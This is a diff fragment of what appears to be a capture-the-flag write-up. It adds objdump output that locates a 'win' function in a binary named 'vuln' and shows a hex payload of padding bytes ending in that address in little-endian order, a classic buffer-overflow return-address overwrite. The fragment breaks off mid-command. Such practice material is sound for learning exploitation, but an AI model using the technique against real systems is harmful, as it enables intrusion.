@@ -21,7 +21,10 @@ Playing around it seems my machine is in Little Endian. So `cb85 0408` is the co
 
 ### Solution:
 ```
-objdump -D vuln | grep win;
+objdump -D vuln | grep win
+080485cb <win>:
+ 80485ed:	75 1a                	jne    8048609 <win+0x3e>
+ --- --- --- 
 echo "00000000: 6161 6161 6161 6161 6161 6161 6161 6161
       00000010: 6161 6161 6161 6161 6161 6161 6161 6161
       00000020: 1818 1818 1717 1717 1616 1616 cb85 0408
